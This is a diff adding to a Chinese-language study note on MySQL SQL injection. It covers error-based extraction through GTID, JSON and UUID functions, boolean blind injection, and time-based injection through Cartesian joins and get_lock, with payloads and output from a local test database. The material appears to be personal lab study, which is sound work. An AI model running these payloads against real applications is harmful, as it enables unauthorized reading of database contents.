@@ -331,7 +331,7 @@ select * from(select * from table1 as a join table1 as b using (id))c;
 select * from(select * from table1 as a join table1 as b using (id,username))c;
 ```
 
-#### 调用不存在的函数
+#### 调用不存在的函数可读取数据库名字
 
 ```
 select misaka();
@@ -340,10 +340,113 @@ select misaka();
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212343727.png)
 
->json gtid uuid todo
+#### GTID函数
 
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242037203.png)
 
+```
+select gtid_subset(user(),1);
+(1772, "Malformed GTID set specification 'root@172.18.0.1'.")
+select gtid_subtract(user(),1);
+(1772, "Malformed GTID set specification 'root@172.18.0.1'.")
+select gtid_subtract((select group_concat(id) from sql_injection_test.table1),1);
+(1772, "Malformed GTID set specification '1,2,3,4'.")
+select gtid_subtract((select group_concat(username) from sql_injection_test.table1),1);
+(1772, "Malformed GTID set specification 'admin,tim,mike,mike'.")
+```
 
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242045868.png)
+
+```
+select * from table1 where id='1' and gtid_subtract((select group_concat(username) from sql_injection_test.table1),1)='1'#
+(1772, "Malformed GTID set specification 'admin,tim,mike,mike'.")
+select * from table1 where id='1' or gtid_subtract((select group_concat(username) from sql_injection_test.table1),1)='1'#
+(1772, "Malformed GTID set specification 'admin,tim,mike,mike'.")
+```
+
+#### JSON函数
+
+据说有版本限制,未进行验证(当前测试版本为`5.7.11`)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242106092.png)
+
+```
+select json_array_append(user(),null,null);
+(3141, 'Invalid JSON text in argument 1 to function json_array_append: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
+select json_array_append(user(),1,2);
+(3141, 'Invalid JSON text in argument 1 to function json_array_append: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
+select json_array_insert(user(),1,2);
+(3141, 'Invalid JSON text in argument 1 to function json_array_insert: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
+select json_insert(user(),1,2);
+(3141, 'Invalid JSON text in argument 1 to function json_insert: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
+select json_merge(user(),1,2);
+(3141, 'Invalid JSON text in argument 1 to function json_merge: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
+select json_merge_patch(user(),1,2);
+(1305, 'FUNCTION information_schema.json_merge_patch does not exist')
+select json_remove(user(),1,2);
+(3141, 'Invalid JSON text in argument 1 to function json_remove: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
+select json_replace(user(),1,2);
+(3141, 'Invalid JSON text in argument 1 to function json_replace: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
+select json_set(user(),1,2);
+(3141, 'Invalid JSON text in argument 1 to function json_set: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
+```
+
+#### UUID
+
+版本限制(大于`8.0`)
+
+[https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html](https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242124969.png)
+
+```
+select uuid_to_bin(user())
+(1411, "Incorrect string value: 'root@192.168.241.1' for function uuid_to_bin")
+select bin_to_uuid(user())
+(1411, "Incorrect string value: 'root@192.168.241.1' for function bin_to_uuid")
+```
+
+### 布尔注入
+
+服务器根据sql语句的执行结果返回`success`或者是`fail`,通过构造语句利用服务器的返回值来判断数据是否符合预期
+
+`select * from user where username='$username'`
+
+`select * from user where username='$username' or 1#`构造永真条件,无论输入的用户名是什么都会返回`success`
+
+```
+select * from table3 where id='1' and length(database())>1
++----+------+
+| id | info |
++----+------+
+| 1  | a    |
++----+------+
+1 row in set
+Time: 0.008s
+select * from table3 where id='1' and length(database())<1
++----+------+
+| id | info |
++----+------+
+0 rows in set
+Time: 0.011s
+```
+
+```
+select * from table3 where id='1' and mid((select group_concat(info) from table3),1,1)<50
++----+------+
+| id | info |
++----+------+
+| 1  | a    |
++----+------+
+1 row in set
+Time: 0.008s
+select * from table3 where id='1' and mid((select group_concat(info) from table3),1,1)>50
++----+------+
+| id | info |
++----+------+
+0 rows in set
+Time: 0.010s
+```
 
 ### 延时注入
 
@@ -377,5 +480,75 @@ SELECT BENCHMARK(1000000,1+1);
 `select * from table3 where id='1' and if (ascii(substr((select group_concat(info) from table3),1,1))>50,benchmark(10e7,1+1),1)#`
 
 3. 笛卡尔积
+
+```
+SELECT count(*) FROM information_schema.columns;
++----------+
+| count(*) |
++----------+
+| 3087     |
++----------+
+1 row in set
+Time: 0.030s
+SELECT count(*) FROM information_schema.columns A,information_schema.columns B;
++----------+
+| count(*) |
++----------+
+| 9529569  |
++----------+
+1 row in set
+Time: 0.289s
+SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;
+跑很久...
+```
+
+```
+select * from table3 where id='-1' or if (length(database())<1,(select count(*) from information_schema.columns a,information_schema.columns b),1)#
++----+------+
+| id | info |
++----+------+
+| 1  | a    |
+| 2  | a    |
+| 3  | b    |
+| 4  | c    |
+| 5  | c    |
++----+------+
+5 rows in set
+Time: 0.018s
+select * from table3 where id='-1' or if (length(database())>1,(select count(*) from information_schema.columns a,information_schema.columns b),1)#
++----+------+
+| id | info |
++----+------+
+| 1  | a    |
+| 2  | a    |
+| 3  | b    |
+| 4  | c    |
+| 5  | c    |
++----+------+
+5 rows in set
+Time: 0.361s
+```
+
+4. get_lock
+
+[https://dev.mysql.com/doc/refman/5.7/en/locking-functions.html](https://dev.mysql.com/doc/refman/5.7/en/locking-functions.html)
+
+`GET_LOCK(str,timeout)`
+
+尝试对`str`加锁,超时时间为`timeout`秒,负值`timeout`表示无限超时
+
+在一个`session`中可以先锁定一个变量`select get_lock('misaka',1);`
+
+然后通过另一个`session`再次执行get_lock函数`select get_lock('misaka',5);`此时会产生5秒的延迟，
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221227308.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201222322928.png)
+
+`select * from table3 where id='-1' or if (length(database())>1,(select get_lock('misaka',5)),1)#`
+
+5. rpad/repeat
+
+>对版本有要求
 
 >todo
